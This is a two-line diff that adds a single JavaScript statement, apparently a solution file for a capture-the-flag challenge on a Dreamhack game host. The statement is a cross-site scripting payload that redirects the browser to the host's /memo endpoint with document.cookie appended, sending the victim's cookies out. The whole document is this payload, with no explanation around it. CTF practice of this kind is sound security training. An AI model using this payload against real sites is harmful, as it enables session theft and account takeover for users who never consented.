@@ -1,0 +1,2 @@
+location.href = "http://host3.dreamhack.games:18187/memo?memo="+document.cookie
+
